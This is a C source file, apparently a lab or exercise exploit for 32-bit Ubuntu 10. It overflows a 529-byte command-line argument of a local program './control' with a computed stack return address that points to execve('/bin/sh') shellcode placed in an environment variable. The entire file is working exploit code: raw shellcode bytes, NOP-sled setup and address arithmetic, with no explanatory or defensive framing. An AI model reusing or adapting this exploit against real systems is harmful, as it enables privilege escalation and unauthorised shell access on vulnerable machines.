// Exploit for Ubuntu 10 (32 Bit)

#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
	char* shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\xb0\x0b\x89\xe2\x31\xc9\xb1\x04\x01\xca\x89\xe1\xcd\x80\x00";

	int nops = 0; // 130000 is max

	char env0[nops + strlen(shellcode)];
	char* arg0 = "./control";
	char arg1[529];

	memset(env0, 0x90, nops);
	memcpy(&env0[nops], shellcode, strlen(shellcode));

	memset(arg1, 0x42, 528);
	arg1[528] = '\0';

	unsigned int addr = 0xc0000000 - 4 - strlen(arg0) - 1 - strlen(env0) - 1;
	addr = htonl(addr);
	memcpy(arg1, (void*) &addr, 4);

	char* argv[3];
	argv[0] = arg0;
	argv[1] = arg1;
	argv[2] = NULL;
	char* envp[2];
	envp[0] = env0;
	envp[1] = NULL;

	execve(arg0, argv, envp);

	return 0;
}
